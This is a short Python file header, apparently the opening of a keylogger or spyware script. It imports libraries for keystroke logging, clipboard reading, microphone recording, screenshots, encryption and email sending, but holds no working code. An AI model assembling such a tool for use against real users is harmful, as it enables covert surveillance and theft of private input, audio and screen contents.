# Libraries

# Libraries for collecting computer information.
import socket
import platform

# Library for clipboard.
import win32clipboard

# Library for registring keystrokes.
from pynput.keyboard import Key, Listener

# Library for system info & time.
import time
import os

# Library for mic capabilities.
from scipy.io.wavfile import write
import sounddevice as sd

# Library for Encryption.
from cryptography.fernet import Fernet

import getpass
from requests import get

# Library for importing screenshots.
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Library for email related functions.
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib